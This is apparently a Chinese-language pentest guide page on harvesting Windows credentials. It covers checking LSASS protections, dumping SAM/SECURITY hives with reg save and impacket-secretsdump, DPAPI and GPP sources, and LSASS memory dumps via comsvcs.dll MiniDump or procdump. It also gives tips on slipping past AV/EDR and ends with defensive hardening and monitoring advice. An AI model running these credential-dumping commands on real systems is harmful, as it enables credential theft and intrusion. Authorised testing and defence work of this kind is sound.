# 凭据

LSASS 读不到，不等于没有身份可用。先判保护类型，再决定要不要碰 LSASS。

## 先看保护

```cmd
whoami /priv
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags
tasklist /FI "IMAGENAME eq lsass.exe"
```

| 观察 | 含义 |
|---|---|
| 没有 `SeDebugPrivilege` 且不是 SYSTEM | 常规 dump 会失败，先走替代来源 |
| `RunAsPPL` = 2 | LSA Protection，不是「换个 mimikatz 参数」能过的 |
| `LsaCfgFlags` 非 0 | Credential Guard 方向，明文/票据缓存往往不可用 |
| 无保护标记但工具被杀 | 更像 AV/EDR，换加载形态或直接放弃直读 |

默认策略：PPL / Credential Guard 开着就**不要在 LSASS 上耗时间**。

## 替代来源（通常更快）

按「当前权限够不够读」排序，而不是按「哪家工具最有名」：

| 来源 | 典型前提 | 公开工具 / 命令方向 |
|---|---|---|
| SAM + SECURITY + SYSTEM hive | 本地高权 | `reg save` 后拷回，`impacket-secretsdump -sam -security -system` |
| LSA Secrets | 能读 SECURITY | 同上；服务账户明文有时在这里 |
| DPAPI / Credential Manager | 用户或 SYSTEM 上下文 | Mimikatz `dpapi::` 系列、`SharpDPAPI`（作者仓库） |
| 计划任务、服务配置、脚本 | 能读任务 XML | 硬编码密码 |
| Web / 应用配置 | `web.config`、连接字符串 | 文件搜索，不是漏洞利用 |
| GPP 历史 | 域用户能读 SYSVOL | 老环境仍可能有 `cpassword` |
| 浏览器 / 会话文件 | 用户权限 | 授权测试范围内才碰 |

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

## 若确认可以接触 LSASS

公开、相对「官方」的离线路径：

```cmd
:: 在授权的高权会话里；产物拷回攻击机离线分析
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\ls.dmp full
```

或 Sysinternals `procdump`（微软签名，实验里有时比直接跑 mimikatz 更不容易被策略当「黑客工具」拦下——不保证）。

本站不提供 Invoke-Mimikatz 反射加载器，也不提供内存补丁。需要 mimikatz 时从 [GentilKiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) 自行获取，只在隔离网使用。

## 失败分类

| 现象 | 先查 |
|---|---|
| OpenProcess 拒绝 | 权限 / PPL |
| 工具一跑就消失 | 静态或行为；换 comsvcs / 离线 hive |
| dump 成功但没有明文 | WDigest 关、Credential Guard、没人交互登录过 |

## 防御侧

- RunAsPPL + Credential Guard
- 限制 Debug 特权；LSASS 只允许受保护进程访问
- 轮换本地管理员；LAPS；不要把密码写进任务和配置文件
- 监控 `comsvcs MiniDump`、`procdump` 对 lsass 的句柄、以及 `reg save HKLM\SAM`
